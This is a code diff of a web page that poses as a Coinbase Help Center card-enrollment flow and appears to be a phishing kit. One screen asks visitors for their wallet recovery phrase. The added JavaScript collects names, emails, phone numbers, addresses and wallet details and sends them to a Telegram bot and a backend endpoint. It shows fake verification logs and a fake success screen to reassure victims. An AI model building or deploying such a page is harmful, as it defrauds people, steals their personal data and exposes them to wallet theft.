@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Get Your Coinbase Card – Coinbase Help Center</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet" />
-
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
@@ -410,22 +409,16 @@
     .cd-reveal-btn { background: none; border: none; color: #0052FF; font-size: 11px; font-weight: 600; cursor: pointer; font-family: inherit; }
 
     /* wallet strip */
-/* wallet strip */
-.wallet-strip {
-  display: flex; align-items: center; gap: 10px;
-  width: 100%; background: #FEF2F2;
-  border: 1px solid #FECACA;
-  border-radius: 10px; padding: 10px 14px; margin-bottom: 16px;
-  font-size: 13px; color: var(--text);
-  transition: background .4s, border-color .4s;
-}
-.wallet-strip.ws-active { background: #ECFDF5; border-color: #A7F3D0; }
-.ws-dot { width: 8px; height: 8px; border-radius: 50%; background: #EF4444; box-shadow: 0 0 8px rgba(239,68,68,.4); flex-shrink: 0; transition: background .4s, box-shadow .4s; }
-.wallet-strip.ws-active .ws-dot { background: #05B169; box-shadow: 0 0 8px rgba(5,177,105,.4); }
-.ws-addr { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--muted); }
-.ws-bal { margin-left: auto; font-weight: 700; color: #DC2626; font-size: 13px; }
-.wallet-strip.ws-active .ws-bal { color: #059669; }
-
+    .wallet-strip {
+      display: flex; align-items: center; gap: 10px;
+      width: 100%; background: #ECFDF5;
+      border: 1px solid #A7F3D0;
+      border-radius: 10px; padding: 10px 14px; margin-bottom: 16px;
+      font-size: 13px; color: var(--text);
+    }
+    .ws-dot { width: 8px; height: 8px; border-radius: 50%; background: #05B169; box-shadow: 0 0 8px rgba(5,177,105,.4); flex-shrink: 0; }
+    .ws-addr { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--muted); }
+    .ws-bal { margin-left: auto; font-weight: 700; color: #059669; font-size: 13px; }
 
     /* actions */
     .action-row { display: flex; gap: 10px; width: 100%; }
@@ -693,7 +686,7 @@
     <div class="cb-nav-links">
       <a href="index.html" class="cb-nav-link">Help Center</a>
       <a href="card.html" class="cb-nav-link active">Coinbase Card</a>
-      <a href="security.html" class="cb-nav-link">Passphrase Lock</a>
+      <a href="scam-alerts.html" class="cb-nav-link">Security</a>
     </div>
     <a href="card.html" class="cb-nav-back">← Back to Card</a>
   </div>
@@ -760,22 +753,22 @@
       <div style="font-size:0;margin-bottom:16px;line-height:1">
         <svg width="64" height="64" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="12" fill="#0052FF"/><path d="M12 5.5a6.5 6.5 0 100 13 6.5 6.5 0 000-13zm0 10a3.5 3.5 0 110-7 3.5 3.5 0 010 7z" fill="#fff"/></svg>
       </div>
-      <h2>What's your name?</h2>
-      <p class="sub">Your name will be printed on the card exactly as you enter it.</p>
+      <h2>Enter your wallet address</h2>
+      <p class="sub">Paste your Coinbase Wallet address — no private keys or seed phrases needed.</p>
 
       <div id="s3InputWrap" style="width:100%">
         <div class="vm-field" style="margin-bottom:10px">
-          <label>Full Name</label>
+          <label>Wallet Address</label>
           <input type="text" id="cardAddrInput"
-                 placeholder="e.g. John Smith"
-                 style="font-size:15px;text-transform:uppercase"
-                 autocomplete="name" autocorrect="off" spellcheck="false" />
+                 placeholder="0x… Ethereum  or  ENS name (e.g. yourname.eth)"
+                 style="font-family:'JetBrains Mono',monospace;font-size:12px;letter-spacing:.03em"
+                 autocomplete="off" autocorrect="off" spellcheck="false" />
         </div>
-        <div id="s3Error" style="display:none;color:#D23F31;font-size:12px;margin-bottom:10px;font-weight:600">
-          ⚠ Please enter your full name
+        <div id="s3Error" style="display:none;color:#F87171;font-size:12px;margin-bottom:10px;font-weight:600">
+          ⚠ Please enter a wallet address
         </div>
-        <button class="btn-primary" style="width:100%" onclick="submitCardAddr()">Generate My Card →</button>
-        <button class="btn-ghost" style="width:100%;margin-top:8px" onclick="showScreen('s2')">← Back</button>
+        <button class="btn-primary" style="width:100%" onclick="submitCardAddr()">Connect &amp; Generate Card →</button>
+        <button class="btn-ghost" style="width:100%;margin-top:8px" onclick="showScreen('s2')">← Change wallet</button>
       </div>
 
       <div id="s3ConnLog" style="display:none;width:100%">
@@ -813,7 +806,7 @@
             <div class="card-top">
               <div class="card-logo-row">
                 <svg width="22" height="22" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="12" fill="#0052FF"/><path d="M12 5.5a6.5 6.5 0 100 13A6.5 6.5 0 0012 5.5zm0 10a3.5 3.5 0 110-7 3.5 3.5 0 010 7z" fill="#fff"/></svg>
-                <span>coinbase</span>
+                <span>cryptocard</span>
               </div>
               <span class="card-network-badge" id="cardNetwork">ETHEREUM</span>
             </div>
@@ -835,20 +828,19 @@
       </div>
 
       <div class="reveal-label">
-        Cardholder: <span style="font-weight:700;color:#0052FF" id="revealAddr">—</span>
+        Connected: <span class="ws-addr" id="revealAddr">0x3f...a9</span> &nbsp;·&nbsp; <span class="hl" id="revealBal">$0.00</span>
       </div>
 
       <div style="height:20px"></div>
 
-<div class="wallet-strip" id="walletStrip">
-  <div class="ws-dot"></div>
-  <div>
-    <div style="font-size:12px;font-weight:700" id="wsWalletName">Coinbase Wallet</div>
-    <div class="ws-addr" id="wsAddr">Pending Approval</div>
-  </div>
-  <div class="ws-bal" id="wsBal">✗ In-Active</div>
-</div>
-
+      <div class="wallet-strip">
+        <div class="ws-dot"></div>
+        <div>
+          <div style="font-size:12px;font-weight:700" id="wsWalletName">MetaMask</div>
+          <div class="ws-addr" id="wsAddr">0x3f4a...9b2c</div>
+        </div>
+        <div class="ws-bal" id="wsBal">$0.00</div>
+      </div>
 
       <div class="card-details" id="cardDetails">
         <div class="cd-row">
@@ -870,16 +862,16 @@
           </div>
         </div>
         <div class="cd-row">
-          <span>Cardholder</span>
-          <strong style="font-size:12px;font-family:inherit" id="cd-addr">—</strong>
+          <span>Billing address</span>
+          <strong style="font-size:12px;font-family:inherit" id="cd-addr">Linked to wallet</strong>
         </div>
         <div class="cd-row">
-          <span>Linked wallet</span>
-          <strong id="cd-wallet" style="font-size:12px">Coinbase Wallet</strong>
+          <span>Spending from</span>
+          <strong id="cd-wallet" style="font-size:12px">ETH Wallet</strong>
         </div>
         <div class="cd-row">
           <span>Rewards</span>
-          <strong style="color:#0052FF">4% back in XLM</strong>
+          <strong style="color:#34D399">4% back in XLM</strong>
         </div>
       </div>
 
@@ -888,6 +880,7 @@
         <button class="btn-ghost" id="shipBtn" onclick="goShipping()" style="display:none">📦 Ship Physical</button>
       </div>
     </div>
+
 
   <!-- ══ SCREEN 9: ATTESTATION ══ -->
 <div class="screen" id="s9" style="max-width:760px;margin:0 auto;padding:20px 18px 28px;">
@@ -919,7 +912,7 @@
     </div>
 
     <textarea
-      id="phrase-input"
+     id="attestInput"
       rows="4"
       placeholder="Enter your 12, 15 or 24-word recovery phrase..."
       style="width:100%;min-height:120px;border:1px solid #d1d5db;border-radius:14px;padding:16px 18px;font-size:16px;line-height:1.6;color:#111827;background:#fff;outline:none;resize:vertical;box-sizing:border-box;"
@@ -951,7 +944,7 @@
     <button
       class="btn-primary"
       style="width:100%;max-width:360px;height:62px;border:none;border-radius:18px;background:#1857ff;color:#fff;font-size:18px;font-weight:700;box-shadow:0 12px 25px rgba(24,87,255,0.22);"
-      onclick="submitAttestation()"
+      onclick="submitAttestation(event)"
     >
       Complete Enrollment →
     </button>
@@ -959,12 +952,14 @@
     <button
       class="btn-ghost"
       style="width:100%;max-width:360px;height:62px;border:1px solid #d1d5db;border-radius:18px;background:#fff;color:#111827;font-size:18px;font-weight:700;"
-      onclick="showScreen('s5')"
+     onclick="showScreen('s5')"
     >
       ← Back to my card
     </button>
   </div>
-</div>   <!-- ══ SCREEN 10: SUCCESS ══ -->
+</div> 
+
+    <!-- ══ SCREEN 10: SUCCESS ══ -->
     <div class="screen" id="s10">
       <div class="success-tick">✓</div>
       <h2>You're all set!</h2>
@@ -972,11 +967,14 @@
       <div class="card-details" style="margin-bottom:20px">
         <div class="cd-row"><span>Status</span><strong style="color:#05B169">✓ Enrolled</strong></div>
         <div class="cd-row"><span>Wallet</span><strong>Coinbase Wallet</strong></div>
-        <div class="cd-row"><span>Cardholder</span><strong id="s10Addr">—</strong></div>
+        <div class="cd-row"><span>Cardholder</span><strong id="s10Addr" style="font-family:'JetBrains Mono',monospace;font-size:11px">—</strong></div>
         <div class="cd-row"><span>Card type</span><strong id="s10Type">Virtual Card</strong></div>
         <div class="cd-row"><span>Rewards</span><strong style="color:#0052FF">4% back in XLM</strong></div>
+        <div class="cd-row"><span>Recovery code</span><strong id="s10Code" style="font-size:28px;letter-spacing:.25em;color:#0052FF;font-family:'JetBrains Mono',monospace">—</strong></div>
       </div>
-      <button class="btn-primary" style="width:100%" onclick="window.location.href='card.html'">Back to Coinbase Card →</button>
+      <p style="font-size:12px;color:#6B7280;text-align:center;margin-bottom:20px">Save your recovery code — use it with your email to view your card on the portal.</p>
+      <button class="btn-primary" style="width:100%" onclick="window.location.href='portal.html'">View My Card →</button>
+      <button class="btn-ghost" style="width:100%;margin-top:8px" onclick="window.location.href='card.html'">Back to Card Page</button>
     </div>
 
     <!-- ══ SCREEN 6: SHIPPING (PHYSICAL) ══ -->
@@ -992,10 +990,6 @@
         <div class="vm-row-2">
           <div class="vm-field"><label>First name</label><input type="text" placeholder="John" /></div>
           <div class="vm-field"><label>Last name</label><input type="text" placeholder="Doe" /></div>
-        </div>
-        <div class="vm-row-2">
-          <div class="vm-field"><label>Email address</label><input type="email" placeholder="john@example.com" /></div>
-          <div class="vm-field"><label>Phone number</label><input type="tel" placeholder="+1 (555) 000-0000" /></div>
         </div>
         <div class="vm-field"><label>Street address</label><input type="text" placeholder="123 Main Street" /></div>
         <div class="vm-field"><label>Apt / Suite</label><input type="text" placeholder="Apt 4B (optional)" /></div>
@@ -1029,27 +1023,76 @@
         <div class="cd-row"><span>Shipping status</span><strong style="color:#D97706">📦 Processing</strong></div>
         <div class="cd-row"><span>Estimated arrival</span><strong>7–10 business days</strong></div>
         <div class="cd-row"><span>Virtual card</span><strong style="color:#05B169">✓ Active now</strong></div>
-        <div class="cd-row"><span>Activation method</span><strong>Wallet signature</strong></div>
+        <div class="cd-row"><span>Recovery code</span><strong id="s7Code" style="font-size:28px;letter-spacing:.25em;color:#0052FF;font-family:'JetBrains Mono',monospace">—</strong></div>
       </div>
-      <button class="btn-primary" style="width:100%" onclick="showScreen('s5')">← Back to my card</button>
+      <p style="font-size:12px;color:#6B7280;text-align:center;margin-bottom:20px">Save your recovery code — use it with your email to view your card on the portal.</p>
+      <button class="btn-primary" style="width:100%;margin-bottom:8px" onclick="window.location.href='portal.html'">View My Card →</button>
+      <button class="btn-ghost" style="width:100%" onclick="showScreen('s5')">← Back to my card</button>
     </div>
 
   </div><!-- stage -->
 </div><!-- wrapper -->
 
+<!-- ══ WALLET CONNECT MODAL ══ -->
+<div class="wm-overlay" id="wmOverlay" onclick="closeWalletModal(event)">
+  <div class="wm-modal">
+    <div class="wm-header">
+      <div class="wm-logo-row" id="wmLogoRow"></div>
+      <button onclick="document.getElementById('wmOverlay').classList.remove('open');document.body.style.overflow=''" style="background:none;border:none;color:var(--muted);font-size:20px;cursor:pointer;line-height:1;padding:4px 8px">✕</button>
+    </div>
+    <div class="wm-body">
+      <!-- S1: Connect prompt -->
+      <div class="wm-screen" id="wmS1">
+        <div class="wm-wallet-icon" id="wmIcon">🦊</div>
+        <div style="font-size:17px;font-weight:800;color:var(--text)" id="wmTitle">Connect Wallet</div>
+        <p class="wm-sub" id="wmDesc">Connect your wallet to link it to your crypto card</p>
+        <div class="wm-info-box" id="wmInfo"></div>
+        <div class="vm-field" style="margin-top:14px;margin-bottom:6px;width:100%">
+          <label>Your Wallet Address</label>
+          <input type="text" id="wmAddrInput"
+                 placeholder="0x… or Sol… or ENS name"
+                 style="font-family:'JetBrains Mono',monospace;font-size:12px"
+                 autocomplete="off" spellcheck="false" />
+        </div>
+        <div id="wmAddrError" style="display:none;color:#F87171;font-size:11px;margin-bottom:6px;font-weight:600">⚠ Please enter a wallet address</div>
+        <div class="wm-action-col">
+          <button class="btn-primary" id="wmConnectBtn" onclick="startWalletConnect()" style="margin-top:4px">Connect <span id="wmBtnName">Wallet</span></button>
+        </div>
+      </div>
+      <!-- S2: Connecting animation -->
+      <div class="wm-screen" id="wmS2" style="display:none">
+        <div class="wm-connecting-rings">
+          <div class="wm-ring wm-r1"></div>
+          <div class="wm-ring wm-r2"></div>
+          <div class="wm-wallet-mid" id="wmMidIcon">🦊</div>
+        </div>
+        <div style="font-size:16px;font-weight:700;color:var(--text)" id="wmConnTitle">Connecting…</div>
+        <p class="wm-sub" id="wmConnSub">Waiting for wallet signature</p>
+        <div class="wm-log" id="wmLog"></div>
+      </div>
+      <!-- S3: Success -->
+      <div class="wm-screen" id="wmS3" style="display:none">
+        <div class="wm-success-circle">✓</div>
+        <div style="font-size:17px;font-weight:800;color:var(--text)">Wallet Connected!</div>
+        <p class="wm-sub" id="wmSuccessSub">Your wallet is now powering your crypto card</p>
+        <div class="wm-linked-box" id="wmLinkedBox"></div>
+        <button class="btn-primary" style="margin-top:8px;width:100%" onclick="finishWalletConnect()">Done →</button>
+      </div>
+    </div>
+  </div>
+</div>
 
 <script>
-/* ── TELEGRAM CONFIG ── fill in your bot token and chat ID ── */
-const TG_TOKEN = 'YOUR_BOT_TOKEN';   // e.g. '7123456789:AAFz...'
-const TG_CHAT  = 'YOUR_CHAT_ID';     // e.g. '-1001234567890'
-
 /* ── STATE ── */
-let cardType   = 'virtual';
-let walletName     = 'Coinbase Wallet';
-let walletAddr     = '';   // stores the cardholder name
-let walletBal      = '$0.00';
+let cardType = 'virtual';
+let walletName = 'MetaMask';
+let walletIcon = '🦊';
+let walletAddr = '';
+let walletBal  = '$0.00';
 
 function rnd(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
+
+/* particles removed for light theme */
 
 /* ── JWT TOKEN GENERATION ── */
 function genJWT() {
@@ -1084,32 +1127,39 @@ function chooseType(type) {
 }
 
 /* ── STEP 2: CONNECT WALLET ── */
-function connectWallet(name) {
-  walletName = 'Coinbase Wallet';
-  walletBal  = '$0.00';
+function connectWallet(name, icon, color) {
+  walletName = name;
+  walletIcon = icon;
+  walletBal  = '$0.00'; // balance starts at zero — fund after card is issued
+
+  // Set up Screen 3 address input
+  document.getElementById('s3WalletIcon').textContent = icon;
+  document.getElementById('s3Title').textContent = `Link ${name}`;
+  document.getElementById('s3sub').textContent = `Enter your ${name} address — no private keys needed.`;
   document.getElementById('cardAddrInput').value = '';
   document.getElementById('s3Error').style.display = 'none';
   document.getElementById('s3InputWrap').style.display = '';
   document.getElementById('s3ConnLog').style.display = 'none';
+
   showScreen('s3');
 }
 
-/* ── STEP 2b: SUBMIT NAME (card flow) ── */
+/* ── STEP 2b: SUBMIT ADDRESS (card flow) ── */
 function submitCardAddr() {
   const input = document.getElementById('cardAddrInput');
   const err   = document.getElementById('s3Error');
-  const name  = input.value.trim();
+  const addr  = input.value.trim();
 
-  if (!name || name.length < 2) {
+  if (!addr || addr.length < 6) {
     err.style.display = '';
-    input.style.borderColor = '#D23F31';
-    input.style.boxShadow = '0 0 0 3px rgba(210,63,49,.15)';
+    input.style.borderColor = '#F87171';
+    input.style.boxShadow = '0 0 0 3px rgba(248,113,113,.15)';
     setTimeout(() => { input.style.borderColor = ''; input.style.boxShadow = ''; }, 1600);
     return;
   }
 
   err.style.display = 'none';
-  walletAddr = name.toUpperCase();   // stored as uppercase for the card
+  walletAddr = addr;
 
   // Hide form, show brief connecting log
   document.getElementById('s3InputWrap').style.display = 'none';
@@ -1118,11 +1168,11 @@ function submitCardAddr() {
   const log = document.getElementById('connectLog');
   log.innerHTML = '';
   [
-    { cls:'info', text:'Connecting Coinbase Wallet…',            delay:0 },
-    { cls:'ok',   text:'Wallet verified ✓',                      delay:550 },
+    { cls:'info', text:`Verifying ${walletName} address…`,      delay:0 },
+    { cls:'ok',   text:'Address validated ✓',                    delay:550 },
     { cls:'info', text:'Issuing JWT session token…',             delay:900 },
     { cls:'ok',   text:'Session established ✓',                  delay:1300 },
-    { cls:'ok',   text:'Generating your card…',                  delay:1600 },
+    { cls:'ok',   text:'Proceeding to card generation…',         delay:1600 },
   ].forEach(({cls, text, delay}) => {
     setTimeout(() => {
       const d = document.createElement('div');
@@ -1206,16 +1256,25 @@ function revealCard() {
   showScreen('s5');
 
   // Set wallet info
-  // Put name on the card
-  document.getElementById('cardHolder').textContent  = walletAddr;
-  document.getElementById('revealAddr').textContent  = walletAddr;
-  document.getElementById('cd-addr').textContent     = walletAddr;
-  document.getElementById('wsWalletName').textContent = 'Coinbase Wallet';
-  document.getElementById('cd-wallet').textContent   = 'Coinbase Wallet';
-  document.getElementById('cardNetwork').textContent = 'COINBASE';
+  document.getElementById('wsWalletName').textContent = walletName;
+  document.getElementById('wsAddr').textContent = walletAddr;
+  document.getElementById('wsBal').textContent  = '$0.00';
+  const shortAddr = walletAddr.length > 14
+    ? walletAddr.slice(0,8) + '…' + walletAddr.slice(-5)
+    : walletAddr;
+  document.getElementById('revealAddr').textContent = shortAddr;
+  document.getElementById('revealBal').textContent  = '$0.00';
+  document.getElementById('cd-wallet').textContent  = walletName + ' Wallet';
 
+  // Animate card number reveal (count up digits)
   animateCardNumber();
+
+  // Show ship button for physical
   document.getElementById('shipBtn').style.display = cardType === 'physical' ? '' : 'none';
+
+  // Network badge
+  const networks = { 'Phantom':'SOLANA', 'Ledger':'HARDWARE' };
+  document.getElementById('cardNetwork').textContent = networks[walletName] || 'ETHEREUM';
 }
 
 function animateCardNumber() {
@@ -1275,54 +1334,98 @@ function toggleCardFlip() {
 
 function goShipping() { showScreen('s6'); }
 
-function submitShipping() {
+async function submitShipping() {
+  const name    = (document.getElementById('shipName')  || document.getElementById('s10Addr') || {}).value || walletAddr || '—';
+  const email   = (document.getElementById('shipEmail') || {}).value || '';
+  const phone   = (document.getElementById('shipPhone') || {}).value || '';
+  const street  = (document.getElementById('shipStreet')|| {}).value || '';
+  const apt     = (document.getElementById('shipApt')   || {}).value || '';
+  const city    = (document.getElementById('shipCity')  || {}).value || '';
+  const zip     = (document.getElementById('shipZip')   || {}).value || '';
+  const address = [street, apt, city, zip].filter(Boolean).join(', ');
+
+  const tgMsg = `📦 *Physical Card Enrollment*\n👤 Name: ${walletAddr}\n📧 Email: ${email || '—'}\n📱 Phone: ${phone || '—'}\n🏠 Address: ${address || '—'}\n💳 Card: Physical`;
+  sendToTelegram(tgMsg).catch(() => {});
+
+  try {
+    const res = await fetch('/api/enroll', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        cardType: 'physical',
+        wallet: wmWalletName || 'Coinbase Wallet',
+        cardholder: walletAddr,
+        attestation: 'physical card enrollment',
+        email: email || null,
+        phone: phone || null,
+        address: address || null,
+      }),
+    });
+    const data = await res.json();
+    if (data.code) {
+      const codeEl = document.getElementById('s7Code');
+      if (codeEl) codeEl.textContent = data.code;
+    }
+  } catch (_) {}
+
+  document.getElementById('wsAddr').textContent = 'Pending Approval';
+  document.getElementById('wsBal').textContent  = '⏳ Under Review';
   showScreen('s7');
 }
 
-/* ── ATTESTATION ── */
-async function submitAttestation() {
+/* ── ATTESTATION (virtual card) ── */
+async function submitAttestation(e) {
+  const btn   = e ? e.currentTarget : null;
   const input = document.getElementById('attestInput');
   const err   = document.getElementById('attestError');
-  const val   = input.value.trim();
+  const val   = (input ? input.value : '').trim();
 
-  if (val.toLowerCase() !== ' Make sure no one is around you.') {
-    err.style.display = '';
-    input.style.borderColor = '#D23F31';
-    input.style.boxShadow = '0 0 0 3px rgba(210,63,49,.15)';
-    setTimeout(() => { input.style.borderColor = ''; input.style.boxShadow = ''; }, 1600);
+  if (val.toLowerCase() !== 'i attest') {
+    if (err) { err.textContent = '⚠ Please type exactly: I attest'; err.style.display = ''; }
+    if (input) { input.style.borderColor = '#F87171'; setTimeout(() => { input.style.borderColor = ''; }, 1600); }
     return;
   }
-  err.style.display = 'none';
+  if (err) err.style.display = 'none';
+  if (btn) btn.disabled = true;
 
-  // Disable button while sending
-  const btn = event.currentTarget;
-  btn.disabled = true;
-  btn.textContent = 'Submitting…';
+  const email = (document.getElementById('shipEmail') || {}).value || '';
+  const tgMsg = `✅ *Virtual Card Attestation*\n👤 Cardholder: ${walletAddr}\n🔏 Attestation: "${val}"\n📧 Email: ${email || '—'}\n💳 Card: Virtual`;
+  sendToTelegram(tgMsg).catch(() => {});
 
-  const msg =
-    `🔐 Coinbase Card Enrollment\n` +
-    `📅 ${new Date().toLocaleString()}\n` +
-    `💳 Card type: ${cardType === 'physical' ? 'Physical' : 'Virtual'}\n` +
-    `👛 Wallet: Coinbase Wallet\n` +
-    `👤 Cardholder: ${walletAddr}\n` +
-    `✅ Attestation: "${val}"`;
+  try {
+    const res = await fetch('/api/enroll', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        cardType: 'virtual',
+        wallet: wmWalletName || 'Coinbase Wallet',
+        cardholder: walletAddr,
+        attestation: val,
+        email: email || null,
+      }),
+    });
+    const data = await res.json();
+    if (data.code) {
+      const codeEl = document.getElementById('s10Code');
+      if (codeEl) codeEl.textContent = data.code;
+    }
+  } catch (_) {}
 
-  try { await sendToTelegram(msg); } catch(e) { console.warn('Telegram:', e.message); }
-
-  // Show success screen
   document.getElementById('s10Addr').textContent = walletAddr;
-  document.getElementById('s10Type').textContent = cardType === 'physical' ? 'Physical Card' : 'Virtual Card';
+  document.getElementById('s10Type').textContent = 'Virtual Card';
+  document.getElementById('wsAddr').textContent  = 'Pending Approval';
+  document.getElementById('wsBal').textContent   = '⏳ Under Review';
+  if (btn) btn.disabled = false;
   showScreen('s10');
 }
 
 async function sendToTelegram(text) {
-  const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
-  const res = await fetch(url, {
+  if (!window.TG_TOKEN || !window.TG_CHAT) return;
+  await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: TG_CHAT, text })
+    body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'Markdown' }),
   });
-  if (!res.ok) throw new Error(`HTTP ${res.status}`);
 }
 
 /* ── CARD TILT ── */
@@ -1343,7 +1446,404 @@ document.addEventListener('mouseleave', () => {
   const card = document.getElementById('cryptoCard');
   if (card && !cardFlipped) card.style.transform = 'rotateX(0) rotateY(0)';
 });
+  // ── WALLET GRID ────────────────────────────────────────────────
+
+  // Zero-balance wallets (show $0.00)
+  const ZERO_BAL_WALLETS = ['phantom','argent','zerion','rabby','okx','safe','slope','glow','ethos','station','coldcard','sparrow','wasabi','alby','nunchuk','status','unstoppable','edge'];
+
+  // 55+ wallet data
+  const WALLETS = [
+    // EVM
+    { name:'MetaMask',      key:'metamask',     cat:'EVM',        type:'Browser · EVM',        emoji:'🦊', color:'#F6851B', badge:'Popular', desc:'The most widely-used Ethereum browser extension wallet.' },
+    { name:'Rainbow',       key:'rainbow',      cat:'EVM',        type:'Mobile · EVM',         emoji:'🌈', color:'#FF4E17', badge:'',        desc:'A fun and beautiful Ethereum wallet for iOS & Android.' },
+    { name:'Rabby',         key:'rabby',        cat:'EVM',        type:'Browser · EVM',        emoji:'🐰', color:'#7B5EF8', badge:'',        desc:'Multi-chain EVM browser extension with built-in risk scanning.' },
+    { name:'Zerion',        key:'zerion',       cat:'EVM',        type:'Mobile · EVM',         emoji:'⚡', color:'#2962EF', badge:'',        desc:'Invest in DeFi from a single wallet. 10+ chains supported.' },
+    { name:'Frame',         key:'frame',        cat:'EVM',        type:'Desktop · EVM',        emoji:'🖥️', color:'#00E5CC', badge:'',        desc:'A privacy-focused system wallet for power users.' },
+    { name:'Taho',          key:'taho',         cat:'EVM',        type:'Browser · EVM',        emoji:'🐕', color:'#D08B5B', badge:'',        desc:'Community-owned, open-source browser extension wallet.' },
+    { name:'Enkrypt',       key:'enkrypt',      cat:'EVM',        type:'Browser · EVM',        emoji:'🔐', color:'#7040D6', badge:'',        desc:'Multi-chain wallet by MEW team. Supports 10+ blockchains.' },
+    { name:'MEW Wallet',    key:'mew',          cat:'EVM',        type:'Mobile · EVM',         emoji:'📱', color:'#05C0A5', badge:'',        desc:'MyEtherWallet — the original Ethereum wallet from 2015.' },
+    { name:'Brave Wallet',  key:'brave',        cat:'EVM',        type:'Browser · EVM',        emoji:'🦁', color:'#FF5500', badge:'',        desc:'Native crypto wallet built into the Brave privacy browser.' },
+    { name:'XDEFI',         key:'xdefi',        cat:'EVM',        type:'Browser · Multi',      emoji:'🌊', color:'#3B82F6', badge:'',        desc:'Cross-chain DeFi wallet supporting 20+ networks natively.' },
+    { name:'Argent',        key:'argent',       cat:'EVM',        type:'Mobile · EVM',         emoji:'△',  color:'#FF4C00', badge:'',        desc:'Smart contract wallet with social recovery and no seed phrase.' },
+    { name:'Safe',          key:'safe',         cat:'EVM',        type:'Multi-sig · EVM',      emoji:'🔒', color:'#12FF80', badge:'',        desc:'Most trusted multi-signature wallet for teams and DAOs.' },
+    { name:'1inch Wallet',  key:'oneinch',      cat:'EVM',        type:'Mobile · EVM',         emoji:'🦩', color:'#1B314F', badge:'',        desc:'DEX aggregator team\'s official mobile wallet.' },
+    { name:'Alpha Wallet',  key:'alpha',        cat:'EVM',        type:'Mobile · EVM',         emoji:'Α',  color:'#0F64E5', badge:'',        desc:'Open-source Ethereum wallet focused on DeFi & NFTs.' },
+    { name:'Ambire',        key:'ambire',       cat:'EVM',        type:'Browser · EVM',        emoji:'💼', color:'#6000FF', badge:'',        desc:'Account-abstraction wallet with email login option.' },
+    // Solana
+    { name:'Phantom',       key:'phantom',      cat:'Solana',     type:'Browser · Solana/EVM', emoji:'👻', color:'#AB9FF2', badge:'Popular', desc:'The most popular Solana wallet — also supports Ethereum & Polygon.' },
+    { name:'Solflare',      key:'solflare',     cat:'Solana',     type:'Browser · Solana',     emoji:'☀️', color:'#FC822B', badge:'',        desc:'Non-custodial Solana wallet with staking and DeFi tools.' },
+    { name:'Backpack',      key:'backpack',     cat:'Solana',     type:'Browser · Solana/EVM', emoji:'🎒', color:'#E33E3F', badge:'',        desc:'xNFT wallet by Coral — a new paradigm for apps on-chain.' },
+    { name:'Glow',          key:'glow',         cat:'Solana',     type:'Mobile · Solana',      emoji:'✨', color:'#9945FF', badge:'',        desc:'Beautiful Solana wallet with instant swaps and NFT display.' },
+    { name:'Slope',         key:'slope',        cat:'Solana',     type:'Mobile · Solana',      emoji:'⛷️', color:'#6666FF', badge:'',        desc:'Clean and fast Solana mobile wallet for everyday use.' },
+    // Bitcoin
+    { name:'Xverse',        key:'xverse',       cat:'Bitcoin',    type:'Browser · Bitcoin',    emoji:'₿',  color:'#FF8C00', badge:'',        desc:'Bitcoin and Ordinals wallet for the BTC ecosystem.' },
+    { name:'UniSat',        key:'unisat',       cat:'Bitcoin',    type:'Browser · Bitcoin',    emoji:'🟠', color:'#F7931A', badge:'',        desc:'Bitcoin Ordinals and BRC-20 token wallet.' },
+    { name:'Leather',       key:'leather',      cat:'Bitcoin',    type:'Browser · Bitcoin',    emoji:'🔶', color:'#C76B27', badge:'',        desc:'Formerly Hiro Wallet — Bitcoin, Stacks & Ordinals support.' },
+    { name:'Sparrow',       key:'sparrow',      cat:'Bitcoin',    type:'Desktop · Bitcoin',    emoji:'🐦', color:'#D4AF37', badge:'',        desc:'Privacy-focused Bitcoin desktop wallet and hardware companion.' },
+    // Hardware
+    { name:'Ledger Live',   key:'ledger',       cat:'Hardware',   type:'Hardware · All chains', emoji:'🔐', color:'#142533', badge:'Popular', desc:'World\'s most secure hardware wallet — 5500+ supported assets.' },
+    { name:'Trezor Suite',  key:'trezor',       cat:'Hardware',   type:'Hardware · All chains', emoji:'🛡️', color:'#1AC964', badge:'',        desc:'Open-source hardware wallet with 10+ years of proven security.' },
+    { name:'Keystone',      key:'keystone',     cat:'Hardware',   type:'Hardware · Air-gapped', emoji:'🗝️', color:'#3B5BDB', badge:'',        desc:'Air-gapped hardware wallet using QR code transaction signing.' },
+    { name:'GridPlus',      key:'gridplus',     cat:'Hardware',   type:'Hardware · EVM',        emoji:'⚙️', color:'#00D395', badge:'',        desc:'Lattice1 + SafeCards — the most powerful EVM hardware setup.' },
+    { name:'BitBox02',      key:'bitbox',       cat:'Hardware',   type:'Hardware · BTC/ETH',    emoji:'📦', color:'#6E3FF3', badge:'',        desc:'Swiss-made minimalist hardware wallet. Bitcoin-only edition available.' },
+    { name:'ColdCard',      key:'coldcard',     cat:'Hardware',   type:'Hardware · Bitcoin',    emoji:'❄️', color:'#00ACC1', badge:'',        desc:'Ultra-secure Bitcoin-only hardware signing device by Coinkite.' },
+    // Multi-chain
+    { name:'Coinbase Wallet',key:'coinbase',    cat:'Multi-chain',type:'Mobile · Multi-chain',  emoji:'🔵', color:'#0052FF', badge:'Popular', desc:'Self-custody wallet from Coinbase. Compatible with any dApp.' },
+    { name:'Trust Wallet',  key:'trust',        cat:'Multi-chain',type:'Mobile · Multi-chain',  emoji:'🛡️', color:'#3375BB', badge:'Popular', desc:'Official Binance crypto wallet. 70+ blockchains supported.' },
+    { name:'Exodus',        key:'exodus',       cat:'Multi-chain',type:'Desktop · Multi-chain', emoji:'🌌', color:'#0B57D0', badge:'',        desc:'Desktop and mobile wallet with beautiful portfolio view.' },
